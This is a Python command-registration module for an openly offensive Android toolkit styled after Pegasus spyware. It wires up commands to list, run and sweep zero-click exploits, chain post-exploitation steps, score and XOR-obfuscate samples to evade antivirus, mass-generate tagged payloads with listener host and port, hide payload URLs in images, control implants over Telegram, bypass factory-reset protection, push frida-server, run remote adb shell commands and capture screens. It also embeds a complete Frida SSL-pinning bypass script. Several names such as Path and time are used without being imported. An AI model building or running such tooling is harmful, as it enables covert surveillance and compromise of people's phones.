"""
Pegasus Phantom Menace v2 - Access Workflow Command Registration

Registers the zero-click exploit suite (and later the post-exploitation,
feature and agent command families) on the shared slash-command manager.

Registration is idempotent: calling :func:`register` twice is a no-op, so the
CLI can call it on every startup without duplicating commands.
"""

from __future__ import annotations

import json
from typing import Any, Dict, List

from rich.console import Console
from rich.table import Table

console = Console()


def _free(scm: Any, name: str) -> bool:
    """Return True when a command name is not already registered."""
    try:
        return scm.get_command(name) is None
    except Exception:
        return name not in getattr(scm, "commands", {})


# ---------------------------------------------------------------------------
# Zero-click exploits
# ---------------------------------------------------------------------------


async def cmd_zeroclick_list(*args: str) -> List[Dict[str, Any]]:
    """List every zero-click exploit, optionally filtered."""
    from pegasus.modules.access_workflow import zero_click

    family = None
    transport = None
    for index, arg in enumerate(args):
        if arg in ("--family", "-f") and index + 1 < len(args):
            family = args[index + 1]
        if arg in ("--transport", "-t") and index + 1 < len(args):
            transport = args[index + 1]

    exploits = zero_click.list_exploits(device_family=family, transport=transport)
    table = Table(title="Zero-Click Exploit Registry")
    table.add_column("Key", style="cyan", no_wrap=True)
    table.add_column("Family")
    table.add_column("Transport")
    table.add_column("CVE / Surface")
    table.add_column("Description", overflow="fold")
    for exploit in exploits:
        table.add_row(
            exploit["key"],
            exploit["device_family"],
            exploit["transport"],
            exploit["cve"],
            exploit["description"],
        )
    console.print(table)
    console.print(f"[dim]{len(exploits)} vector(s). Run one with: /zeroclick-run <key>[/dim]")
    return exploits


async def cmd_zeroclick_run(*args: str) -> Dict[str, Any]:
    """Execute a single zero-click exploit by registry key."""
    from pegasus.modules.access_workflow import zero_click

    if not args:
        console.print("[red]Usage: /zeroclick-run <key> [kw=value ...][/red]")
        console.print("[dim]Discover keys with /zeroclick-list[/dim]")
        return {}
    key = args[0]
    kwargs: Dict[str, Any] = {}
    for arg in args[1:]:
        if "=" in arg:
            name, value = arg.split("=", 1)
            kwargs[name.replace("-", "_")] = value
    console.print(f"[cyan]Running zero-click vector:[/] {key}")
    try:
        result = zero_click.run_exploit(key, **kwargs)
    except Exception as exc:
        console.print(f"[red]Exploit failed:[/] {exc}")
        return {"exploit": key, "status": "error", "error": str(exc)}
    console.print_json(data=result)
    return result


async def cmd_zeroclick_sweep(*args: str) -> List[Dict[str, Any]]:
    """Run every vector for a device family (default: all families)."""
    from pegasus.modules.access_workflow import zero_click

    family = args[0] if args else None
    console.print(f"[cyan]Sweeping zero-click vectors[/] ({family or 'all families'})")
    results = zero_click.run_all(device_family=family)
    ok = sum(1 for item in results if item.get("status") != "error")
    console.print(f"[green]{ok}/{len(results)} vectors completed without error.[/green]")
    return results


def register(scm: Any) -> None:
    """Register workflow commands on a slash-command manager."""
    _register_zero_click(scm)
    _register_post_exploitation(scm)
    _register_features(scm)
    _register_platform(scm)
    _register_web_console(scm)


def _register_zero_click(scm: Any) -> None:
    if _free(scm, "/zeroclick-list"):
        scm.register(
            "/zeroclick-list",
            "List zero-click exploit vectors (optionally --family/--transport)",
            cmd_zeroclick_list,
            category="exploit",
            examples=["/zeroclick-list", "/zeroclick-list --family pixel8"],
        )
    if _free(scm, "/zeroclick-run"):
        scm.register(
            "/zeroclick-run",
            "Run a zero-click exploit by registry key",
            cmd_zeroclick_run,
            category="exploit",
            examples=["/zeroclick-run android_bluetooth"],
        )
    if _free(scm, "/zeroclick-sweep"):
        scm.register(
            "/zeroclick-sweep",
            "Run every zero-click vector for a family",
            cmd_zeroclick_sweep,
            category="exploit",
            examples=["/zeroclick-sweep pixel8"],
        )


# ---------------------------------------------------------------------------
# Post-exploitation
# ---------------------------------------------------------------------------


async def cmd_postexploit_list(*args: str) -> List[Dict[str, Any]]:
    """List the post-exploitation chain in execution order."""
    from pegasus.modules.access_workflow.post_exploitation import registry

    steps = registry.list_commands()
    table = Table(title="Post-Exploitation Steps")
    table.add_column("#", style="cyan", no_wrap=True)
    table.add_column("Step", style="bold")
    table.add_column("Description", overflow="fold")
    for step in steps:
        table.add_row(str(step["position"] or "-"), step["key"], step["description"])
    console.print(table)
    return steps


async def cmd_postexploit_run(*args: str) -> Dict[str, Any]:
    """Run one post-exploitation step."""
    from pegasus.modules.access_workflow.post_exploitation import registry

    if not args:
        console.print("[red]Usage: /postexploit-run <step>[/red]")
        return {}
    try:
        result = await registry.run(args[0])
    except Exception as exc:
        console.print(f"[red]Step failed:[/] {exc}")
        return {"step": args[0], "status": "error", "error": str(exc)}
    console.print_json(data=result)
    return result


async def cmd_postexploit_chain(*args: str) -> List[Dict[str, Any]]:
    """Run the whole post-exploitation chain."""
    from pegasus.modules.access_workflow.post_exploitation import registry

    console.print("[cyan]Running full post-exploitation chain...[/cyan]")
    results = await registry.run_chain()
    failed = [item for item in results if item.get("status") == "error"]
    if failed:
        console.print(f"[red]Chain stopped at:[/] {failed[0]['step']}")
    else:
        console.print(f"[green]Chain completed:[/] {len(results)} steps")
    return results


def _register_post_exploitation(scm: Any) -> None:
    if _free(scm, "/postexploit-list"):
        scm.register(
            "/postexploit-list",
            "List post-exploitation steps",
            cmd_postexploit_list,
            category="exploit",
        )
    if _free(scm, "/postexploit-run"):
        scm.register(
            "/postexploit-run",
            "Run one post-exploitation step",
            cmd_postexploit_run,
            category="exploit",
            examples=["/postexploit-run fingerprint"],
        )
    if _free(scm, "/postexploit-chain"):
        scm.register(
            "/postexploit-chain",
            "Run the full post-exploitation chain",
            cmd_postexploit_chain,
            category="exploit",
        )

# ---------------------------------------------------------------------------
# Feature commands: AI mutation, mass payload, DNA, steganography, Telegram, FRP
# ---------------------------------------------------------------------------


async def cmd_mutate_analyse(*args: str) -> Dict[str, Any]:
    """Analyse a sample for AV signature exposure and print a mutation plan."""
    from pegasus.modules.access_workflow import ai_mutation

    if not args:
        console.print("[red]Usage: /mutate-analyse <apk-or-smali-dir> [--out report.json][/red]")
        return {}
    output = None
    if "--out" in args:
        index = args.index("--out")
        if index + 1 < len(args):
            output = args[index + 1]
        args = args[:index] + args[index + 2:]
    try:
        plan = ai_mutation.analyse(args[0], output=output)
    except ai_mutation.MutationError as exc:
        console.print(f"[red]{exc}[/red]")
        return {}
    colour = "red" if plan["exposure_score"] >= 70 else "yellow" if plan["exposure_score"] >= 40 else "green"
    console.print(f"[{colour}]Exposure score: {plan['exposure_score']}/100 ({plan['verdict']})[/{colour}]")
    table = Table(title="Mutation Plan")
    table.add_column("Technique", style="cyan")
    table.add_column("Effort")
    table.add_column("Break strength")
    table.add_column("Instruction", overflow="fold")
    for item in plan["recommendations"]:
        table.add_row(item["id"], item["effort"], item["breaks_signature"], item["technique"])
    console.print(table)
    if plan.get("report"):
        console.print(f"[dim]Report: {plan['report']}[/dim]")
    return plan


async def cmd_mutate_xor(*args: str) -> Dict[str, Any]:
    """Write XOR-obfuscated copies of every readable unit in a sample."""
    from pegasus.modules.access_workflow import ai_mutation

    if not args:
        console.print("[red]Usage: /mutate-xor <apk-or-dir> [key_hex][/red]")
        return {}
    key = int(args[1], 16) if len(args) > 1 else 0x5A
    try:
        result = ai_mutation.apply_string_xor(args[0], key=key)
    except ai_mutation.MutationError as exc:
        console.print(f"[red]{exc}[/red]")
        return {}
    console.print_json(data=result)
    return result


async def cmd_payload_mass(*args: str) -> Dict[str, Any]:
    """Generate a batch of payloads with optional DNA tagging."""
    from pegasus.modules.access_workflow import mass_payload

    options = {"lhost": "127.0.0.1", "port": "4444", "count": "5", "campaign": "mass", "formats": "", "out": ""}
    positional: List[str] = []
    index = 0
    while index < len(args):
        token = args[index]
        if token.startswith("--") and index + 1 < len(args):
            options[token[2:]] = args[index + 1]
            index += 2
            continue
        positional.append(token)
        index += 1
    if positional:
        options["lhost"] = positional[0]

    try:
        manifest = mass_payload.generate_batch(
            lhost=options["lhost"],
            start_port=int(options["port"]),
            count=int(options["count"]),
            formats=[item for item in options["formats"].split(",") if item] or None,
            output_dir=options["out"] or "~/.pegasus/payloads/mass",
            campaign=options["campaign"],
        )
    except (mass_payload.MassPayloadError, ValueError) as exc:
        console.print(f"[red]{exc}[/red]")
        return {}
    table = Table(title="Mass Payload Batch")
    table.add_column("#")
    table.add_column("Payload")
    table.add_column("Port")
    table.add_column("Built")
    table.add_column("DNA")
    for build in manifest["builds"]:
        table.add_row(str(build["index"]), build["name"], str(build["port"]), "yes" if build["built"] else "script", build.get("dna_tag") or "-")
    console.print(table)
    console.print(f"[dim]Manifest: {manifest['manifest']}[/dim]")
    return manifest


async def cmd_payload_dna(*args: str) -> Any:
    """DNA registry: list, lookup <tag>, match <file>, tag <file> <target>."""
    from pegasus.modules.access_workflow import dna

    action = args[0] if args else "list"
    if action == "lookup" and len(args) > 1:
        record = dna.lookup(args[1])
        console.print_json(data=record or {"error": "not found"})
        return record
    if action == "match" and len(args) > 1:
        matches = dna.match_payload(args[1])
        console.print_json(data=matches)
        return matches
    if action == "tag" and len(args) > 2:
        record = dna.generate_tag(args[1], target=args[2], campaign=args[3] if len(args) > 3 else "default")
        console.print_json(data=record)
        return record
    records = dna.list_tags()
    table = Table(title="Payload DNA Registry")
    table.add_column("Tag", style="cyan")
    table.add_column("Campaign")
    table.add_column("Target")
    table.add_column("Payload")
    for record in records:
        table.add_row(record["tag"], record["campaign"], record["target"], record["payload_name"])
    console.print(table)
    return records


async def cmd_stego_embed(*args: str) -> Dict[str, Any]:
    """Embed a URL into a cover image: /stego-embed <cover> <url> [out] [key]"""
    from pegasus.modules.access_workflow import steganography

    if len(args) < 2:
        console.print("[red]Usage: /stego-embed <cover> <url> [output] [key][/red]")
        return {}
    output = args[2] if len(args) > 2 else "stego_output.png"
    key = args[3] if len(args) > 3 else None
    try:
        result = steganography.embed(args[0], args[1], output, key=key)
    except steganography.StegoError as exc:
        console.print(f"[red]{exc}[/red]")
        return {}
    console.print_json(data=result)
    return result


async def cmd_stego_extract(*args: str) -> Dict[str, Any]:
    """Extract a payload from a stego image: /stego-extract <image> [key]"""
    from pegasus.modules.access_workflow import steganography

    if not args:
        console.print("[red]Usage: /stego-extract <image> [key][/red]")
        return {}
    try:
        result = steganography.extract(args[0], key=args[1] if len(args) > 1 else None)
    except steganography.StegoError as exc:
        console.print(f"[red]{exc}[/red]")
        return {}
    console.print_json(data=result)
    return result


async def cmd_telegram(*args: str) -> Any:
    """Telegram control: setup <token> [chat], start, stop, notify <text>."""
    from pegasus.modules.access_workflow import telegram_control

    action = args[0] if args else "status"
    try:
        if action == "setup" and len(args) > 1:
            result = telegram_control.setup(args[1], args[2] if len(args) > 2 else "")
        elif action == "start":
            result = telegram_control.start_bot()
        elif action == "stop":
            result = {"stopped": telegram_control.stop_bot()}
        elif action == "notify" and len(args) > 1:
            result = telegram_control.send_message(" ".join(args[1:]))
        else:
            result = telegram_control.bot_info()
    except telegram_control.TelegramError as exc:
        console.print(f"[red]{exc}[/red]")
        return {}
    console.print_json(data=result)
    return result


async def cmd_frp(*args: str) -> Dict[str, Any]:
    """FRP workflow: plan, run [serial] [bypass_apk]."""
    from pegasus.modules.access_workflow import frp_unlock

    action = args[0] if args else "plan"
    if action == "run":
        result = frp_unlock.run(serial=args[1] if len(args) > 1 else None, bypass_apk=args[2] if len(args) > 2 else None)
    else:
        plan = frp_unlock.plan()
        table = Table(title="FRP Unlock Plan")
        table.add_column("#")
        table.add_column("Method")
        table.add_column("Note", overflow="fold")
        for index, step in enumerate(plan, 1):
            table.add_row(str(index), step["label"], step.get("note", ""))
        console.print(table)
        result = {"plan": plan}
    console.print_json(data=result)
    return result


def _register_features(scm: Any) -> None:
    entries = [
        ("/mutate-analyse", "Score a sample for AV signatures and print a mutation plan", cmd_mutate_analyse),
        ("/mutate-xor", "Write XOR-obfuscated copies of a sample", cmd_mutate_xor),
        ("/payload-mass", "Generate a payload batch with DNA tagging", cmd_payload_mass),
        ("/payload-dna", "Inspect the payload DNA registry", cmd_payload_dna),
        ("/stego-embed", "Hide a URL in a cover image", cmd_stego_embed),
        ("/stego-extract", "Recover a payload from a stego image", cmd_stego_extract),
        ("/telegram", "Telegram remote control: setup/start/stop/notify", cmd_telegram),
        ("/frp", "FRP unlock plan or run", cmd_frp),
    ]
    for name, description, handler in entries:
        if _free(scm, name):
            scm.register(name, description, handler, category="exploit")


# ---------------------------------------------------------------------------
# Agent factory and daemon
# ---------------------------------------------------------------------------


async def cmd_factory(*args: str) -> Any:
    """Run a global factory command: /factory list|run <cmd> [args...]"""
    from pegasus.modules.access_workflow.agent import get_command_factory

    factory = get_command_factory()
    action = args[0] if args else "list"
    if action == "run" and len(args) > 1:
        try:
            result = factory.run(args[1], *args[2:])
        except Exception as exc:
            console.print(f"[red]{exc}[/red]")
            return {}
        console.print_json(data=result)
        return result
    commands = factory.list_commands()
    table = Table(title=f"Global Command Factory ({len(commands)} commands)")
    table.add_column("Command", style="cyan")
    table.add_column("Category")
    table.add_column("Description", overflow="fold")
    for command in commands:
        table.add_row(command["name"], command["category"], command["description"])
    console.print(table)
    return commands


async def cmd_agent(*args: str) -> Any:
    """Run an agent task: /agent <name> <task>"""
    from pegasus.modules.access_workflow.agent import execute_agent, list_agents

    if len(args) >= 2:
        result = execute_agent(args[0], " ".join(args[1:]))
        console.print_json(data=result)
        return result
    agents = list_agents()
    console.print_json(data=agents)
    return agents


async def cmd_daemon(*args: str) -> Dict[str, Any]:
    """Daemon control: status, start, stop, restart."""
    from pegasus.modules.access_workflow import daemon_service

    daemon = daemon_service.get_daemon()
    action = args[0] if args else "status"
    if action == "start":
        daemon.start()
    elif action == "stop":
        daemon.stop()
    elif action == "restart":
        daemon.restart()
    info = daemon.status()
    console.print_json(data=info)
    return info


def _register_platform(scm: Any) -> None:
    for name, description, handler in [
        ("/factory", "Global command factory (28 commands)", cmd_factory),
        ("/agent", "List or run agents", cmd_agent),
        ("/daemon", "Dashboard daemon control", cmd_daemon),
    ]:
        if _free(scm, name):
            scm.register(name, description, handler, category="platform")




# ---------------------------------------------------------------------------
# Web-console compatibility commands
# ---------------------------------------------------------------------------


async def cmd_access_menu(*args: str) -> Dict[str, Any]:
    """Summarise the access workflow entry points."""
    menu = {
        "vectors": "/access-vectors - enumerate zero-click vectors",
        "autonomous": "/access-autonomous - sweep every vector",
        "manual": "/postexploit-list - ordered post-exploitation steps",
    }
    console.print_json(data=menu)
    return menu


async def cmd_access_vectors(*args: str) -> Any:
    return await cmd_zeroclick_list(*args)


async def cmd_access_zero_click(*args: str) -> Any:
    return await cmd_zeroclick_list(*args)


async def cmd_access_autonomous(*args: str) -> Any:
    return await cmd_zeroclick_sweep(*args)


async def cmd_access_manual(*args: str) -> Any:
    return await cmd_postexploit_list()


async def cmd_auto_fetch(*args: str) -> Dict[str, Any]:
    """Pull the current screen from the first attached device."""
    from pegasus.modules.access_workflow import nso_ops

    serial = args[0] if args else nso_ops.device_serial()
    if not serial:
        return {"ok": False, "error": "no device"}
    result = nso_ops.screen_capture(serial)
    console.print_json(data=result)
    return result


async def cmd_brutdroid_frida(*args: str) -> Dict[str, Any]:
    """Push and start a local frida-server binary on the device."""
    import subprocess

    from pegasus.modules.access_workflow import nso_ops

    candidates = [Path.home() / ".pegasus" / "tools" / "frida-server", Path("C:/tools/frida-server")]
    candidate = next((path for path in candidates if path.exists()), None)
    if not candidate:
        result = {"ok": False, "error": "frida-server binary not found in ~/.pegasus/tools"}
    else:
        subprocess.run(["adb", "push", str(candidate), "/data/local/tmp/frida-server"], capture_output=True, text=True)
        subprocess.run(["adb", "shell", "chmod", "755", "/data/local/tmp/frida-server"], capture_output=True, text=True)
        proc = subprocess.Popen(["adb", "shell", "/data/local/tmp/frida-server", "-D"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        result = {"ok": True, "pid": proc.pid, "binary": str(candidate), "serial": nso_ops.device_serial()}
    console.print_json(data=result)
    return result


async def cmd_fingerprint(*args: str) -> Dict[str, Any]:
    """Fingerprint the attached device."""
    from pegasus.modules.access_workflow.post_exploitation import run_sync

    result = run_sync("fingerprint")
    console.print_json(data=result)
    return result


async def cmd_keepalive(*args: str) -> Dict[str, Any]:
    """Keep the screen awake while plugged in."""
    import subprocess

    from pegasus.modules.access_workflow import nso_ops

    serial = nso_ops.device_serial()
    if not serial:
        return {"ok": False, "error": "no device"}
    subprocess.run(["adb", "-s", serial, "shell", "svc", "power", "stayon", "true"], capture_output=True)
    subprocess.run(["adb", "-s", serial, "shell", "settings", "put", "global", "stay_on_while_plugged_in", "3"], capture_output=True)
    return {"ok": True, "serial": serial}


async def cmd_passgen(*args: str) -> Dict[str, Any]:
    """Generate a password."""
    import secrets
    import string

    length = int(args[0]) if args and args[0].isdigit() else 20
    alphabet = string.ascii_letters + string.digits + "!@#$%^&*"
    value = "".join(secrets.choice(alphabet) for _ in range(length))
    console.print(f"[green]{value}[/green]")
    return {"password": value, "length": length}


async def cmd_payload_bind(*args: str) -> Dict[str, Any]:
    """Build one APK payload and label it with a DNA tag."""
    from pegasus.modules.access_workflow import mass_payload

    manifest = mass_payload.generate_batch(lhost=args[0] if args else "127.0.0.1", count=1, formats=["android"], campaign="bind")
    console.print_json(data=manifest)
    return manifest


async def cmd_payload_mutate(*args: str) -> Any:
    return await cmd_mutate_analyse(*args)


async def cmd_payload_qr(*args: str) -> Dict[str, Any]:
    """Render a delivery URL as a QR code."""
    if not args:
        return {"error": "usage: /payload-qr <url>"}
    try:
        import qrcode
    except ImportError:
        return {"error": "qrcode not installed"}
    target = Path.home() / ".pegasus" / "payloads" / f"qr_{int(time.time())}.png"
    target.parent.mkdir(parents=True, exist_ok=True)
    qrcode.make(args[0]).save(str(target))
    console.print(f"[green]QR saved:[/green] {target}")
    return {"path": str(target)}


async def cmd_payload_ssl(*args: str) -> Dict[str, Any]:
    """Write a Frida SSL-pinning bypass script."""
    script = (
        "Java.perform(function () {\n"
        "  var TrustManager = Java.use('javax.net.ssl.X509TrustManager');\n"
        "  var TrustAll = Java.registerClass({\n"
        "    name: 'org.pegasus.TrustAll', implements: [TrustManager],\n"
        "    methods: {\n"
        "      checkClientTrusted: function () {}, checkServerTrusted: function () {},\n"
        "      getAcceptedIssuers: function () { return []; }\n"
        "    }\n"
        "  });\n"
        "  var SSLContext = Java.use('javax.net.ssl.SSLContext');\n"
        "  var ctx = SSLContext.getInstance('TLS');\n"
        "  ctx.init(null, [TrustAll.$new()], null);\n"
        "  SSLContext.getInstance.overload('java.lang.String').implementation = function (proto) {\n"
        "    return ctx;\n"
        "  };\n"
        "});\n"
    )
    target = Path.home() / ".pegasus" / "frida" / "ssl_bypass.js"
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(script, encoding="utf-8")
    return {"path": str(target), "bytes": len(script)}


async def cmd_session_info(*args: str) -> Dict[str, Any]:
    from pegasus.modules.access_workflow import nso_ops

    return nso_ops.device_profile(args[0] if args else None)


async def cmd_session_command(*args: str) -> Dict[str, Any]:
    """Run an adb shell command on the active device."""
    import subprocess

    from pegasus.modules.access_workflow import nso_ops

    serial = nso_ops.device_serial()
    if not serial or not args:
        return {"ok": False, "error": "usage: /session-command <command>"}
    proc = subprocess.run(["adb", "-s", serial, "shell", *args], capture_output=True, text=True, timeout=60)
    return {"ok": proc.returncode == 0, "stdout": proc.stdout[-4000:], "stderr": proc.stderr[-2000:]}


async def cmd_sessions(*args: str) -> Dict[str, Any]:
    import subprocess

    from pegasus.modules.access_workflow import nso_ops

    devices = []
    try:
        out = subprocess.run(["adb", "devices", "-l"], capture_output=True, text=True, timeout=8).stdout
        devices = [line.split()[0] for line in out.splitlines()[1:] if line.strip()]
    except OSError:
        pass
    return {"devices": devices, "count": len(devices), "active": nso_ops.device_serial()}


def _register_web_console(scm: Any) -> None:
    entries = {
        "/access-menu": ("Access workflow overview", cmd_access_menu),
        "/access-vectors": ("List access vectors", cmd_access_vectors),
        "/access-zero-click": ("List zero-click vectors", cmd_access_zero_click),
        "/access-autonomous": ("Sweep zero-click vectors", cmd_access_autonomous),
        "/access-manual": ("List manual post-exploitation steps", cmd_access_manual),
        "/auto-fetch": ("Capture the current screen", cmd_auto_fetch),
        "/brutdroid-frida-server": ("Push and start frida-server", cmd_brutdroid_frida),
        "/fingerprint": ("Fingerprint the device", cmd_fingerprint),
        "/keepalive": ("Keep the screen awake", cmd_keepalive),
        "/passgen": ("Generate a password", cmd_passgen),
        "/payload-bind": ("Build and tag one APK", cmd_payload_bind),
        "/payload-mutate": ("Mutation analysis", cmd_payload_mutate),
        "/payload-qr": ("Render a QR delivery code", cmd_payload_qr),
        "/payload-ssl": ("Write a Frida SSL bypass script", cmd_payload_ssl),
        "/session-command": ("Run an adb shell command", cmd_session_command),
        "/session-info": ("Device profile for the session", cmd_session_info),
        "/sessions": ("List ADB sessions", cmd_sessions),
    }
    for name, (description, handler) in entries.items():
        if _free(scm, name):
            scm.register(name, description, handler, category="access")
